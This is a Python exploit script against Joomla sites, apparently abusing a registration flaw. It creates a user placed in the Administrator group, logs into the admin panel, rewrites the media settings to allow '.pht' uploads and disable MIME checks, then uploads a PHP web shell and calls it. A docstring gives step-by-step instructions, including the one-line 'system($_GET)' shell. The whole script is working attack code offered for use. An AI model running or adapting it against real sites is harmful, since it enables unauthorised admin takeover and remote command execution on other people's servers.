#!/usr/bin/python3
import requests
import sys
import re
import argparse
import base64
import os
import random
import time
from html.parser import HTMLParser
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
How to exploit:

  1) Run script, get user access
  2) [optional] - Activate your account
  3) Go to Content > Media
  4) Click 'Options'
  5.1) Add php3, php4, php5, pht to 'Legal Extensions' & Legal Image Extensions
  5.2) Disable 'Restrict Uploads' & 'Check MIME Types'
  6) Upload '.pht' file with:
      <?= system($_GET['x']);
  7) Pwned
"""

def randomname(extn='.pht'):
    return base64.b32encode(os.urandom(20)).decode()[:random.randint(5, 10)] + extn

def extract_token(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print("[!] Cannot find CSRF token")
        return None
    return match.group(1)

def try_admin_login(options, sess):
    admin_url = options.url + '/administrator/index.php'
    print('[-] Getting token for admin login')
    resp = sess.get(admin_url, verify=False)
    token = extract_token(resp)
    if not token:
        return False
    print('[-] Logging in to admin')
    data = {
        'username': options.username,
        'passwd': options.password,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_url, data=data, verify=False)
    if 'task=profile.edit' not in resp.text:
        print('[!] Admin Login Failure!')
        return False
    print('[+] Admin Login Success!')
    return True

def get_media_options(options, sess):
    print("[+] Getting media options")
    media_options_url = options.url + '/administrator/index.php?option=com_config&view=component&component=com_media&path='
    resp = sess.get(media_options_url, verify=False)
    results = re.findall(r'name="([^"]+)"\s+[^>]*?value="([^"]+)"', resp.text, re.S)
    if not results:
        print("[!] Fail")
        return None
    return dict(results)

def set_media_options(options, sess, data):
    """
    Allow us to upload a .pht file
    """
    print("[+] Setting media options")
    newdata = {
        'jform[upload_extensions]': 'bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS',
        'jform[upload_maxsize]': 10,
        'jform[file_path]': 'images',
        'jform[image_path]': 'images',
        'jform[restrict_uploads]': 1,
        'jform[check_mime]': 0,
        'jform[image_extensions]': 'bmp,gif,jpg,png',
        'jform[ignore_extensions]': '',
        'jform[upload_mime]': 'image/jpeg,image/gif,image/png,image/bmp,application/x-shockwave-flash,application/msword,application/excel,application/pdf,application/powerpoint,text/plain,application/x-zip',
        'jform[upload_mime_illegal]': 'text/html',
        'id': 13
    }
    newdata.update(data)
    newdata['component'] = 'com_media'
    newdata['task'] = 'config.save.component.apply'
    config_url = options.url + '/administrator/index.php?option=com_config'
    resp = sess.post(config_url, data=newdata, verify=False)
    if 'jform[upload_extensions]' not in resp.text:
        print('[!] Maybe failed to set media options...')
        return False
    return True

def add_item(data, field, item):
    current = data.get(field, '')
    items = set(filter(None, current.split(',')))
    items.add(item)
    return ",".join(items)

def stage_two(options, sess):
    """Now we are logged in to admin area,
       use this to gain shell execution using .pht upload.
    """
    media_options = get_media_options(options, sess)
    if not media_options:
        return False
    media_options.update({
        'jform[check_mime]': 0,
        'jform[restrict_uploads]': 0,
        'jform[upload_extensions]': add_item(media_options, 'jform[upload_extensions]', 'pht'),
        'jform[image_extensions]': add_item(media_options, 'jform[image_extensions]', 'pht'),
        'jform[upload_mime]': add_item(media_options, 'jform[upload_mime]', 'application/octet-stream'),
    })
    if not set_media_options(options, sess, media_options):
        return False
    image_path = media_options.get('jform[image_path]', 'images')
    return upload_file(options, sess, image_path)

def upload_file(options, sess, image_path):
    print("[*] Uploading exploit.pht")
    url = options.url + "/administrator/index.php?option=com_media&folder="
    resp = sess.get(url, verify=False)
    match = re.search(r'form action="([^"]+)" id="uploadForm"', resp.text, re.S)
    if not match:
        print("[!] Cannot find file upload form!")
        return False
    upload_url = HTMLParser().unescape(match.group(1))
    filename = randomname()
    exploit_url = f"{options.url}/{image_path}/{filename}"
    print("[*] Uploading exploit to:", exploit_url)
    files = {
        'Filedata[]': (filename, options.exploit.read(), 'application/octet-stream')
    }
    data = dict(folder="")
    resp = sess.post(upload_url, files=files, data=data, verify=False)
    if filename not in resp.text:
        print("[!] Failed to upload file!")
        return False
    print("[*] Calling exploit")
    resp = sess.get(exploit_url, verify=False)
    if options.search not in resp.text:
        print("[!] Search string not in exploit")
        print(resp.text)
        return False
    print("[$] Exploit Successful!")
    return True

def create_user(options, sess, token):
    """
    Create an Administrator user using the CVE
    """
    data = {
        'user[name]': options.username,
        'user[username]': options.username,
        'user[password1]': options.password,
        'user[password2]': options.password,
        'user[email1]': options.email,
        'user[email2]': options.email,
        'user[groups][]': '7',  # Administrator group
        'user[activation]': '0',
        'user[block]': '0',
        'form[name]': options.username,
        'form[username]': options.username,
        'form[password1]': options.password,
        'form[password2]': options.password,
        'form[email1]': options.email,
        'form[email2]': options.email,
        'form[option]': 'com_users',
        'form[task]': 'user.register',
        token: '1',
    }
    return sess.post(options.url + "/index.php/component/users/?task=user.register", data=data, allow_redirects=False, verify=False)

def parse_options():
    try:
        exploit_file = open('filthyc0w.pht', 'r')
    except Exception:
        exploit_file = None
    parser = argparse.ArgumentParser(description='Joomla Exploit')
    parser.add_argument('url', help='Base URL for Joomla site')
    parser.add_argument('-u', '--username', default='user')
    parser.add_argument('-p', '--password', default='password')
    parser.add_argument('-e', '--email', default='user@example.com')
    parser.add_argument('-s', '--search', default='098f6bcd4621d373cade4e832627b4f6')
    parser.add_argument('-x', '--exploit', default=exploit_file, type=argparse.FileType('r'))
    return parser.parse_args()

def pwn_joomla(options):
    sess = requests.Session()
    print("[-] Getting token")
    resp = sess.get(options.url + "/index.php/component/users/?view=login", verify=False)
    token = extract_token(resp)
    if not token:
        return False
    print("[-] Creating user account")
    resp = create_user(options, sess, token)
    can_login = try_admin_login(options, sess)
    if not can_login:
        print("[-] Check email for activation code")
        try:
            input('[?] Press any key after activation')
        except KeyboardInterrupt:
            return False
        can_login = try_admin_login(options, sess)
    if not can_login:
        print('[!] Cannot login with user account')
        return False
    print('[-] Uploading exploit')
    return stage_two(options, sess)

def main():
    options = parse_options()
    if not options.exploit:
        print('[!] No exploit file opened')
        sys.exit(1)
    if not options.url.startswith('http'):
        print('[!] URL must start with http(s)')
        sys.exit(1)
    if not pwn_joomla(options):
        print('[!] Exploit failed')
        sys.exit(1)
    print('[+] Exploit finished successfully')

if __name__ == '__main__':
    main()
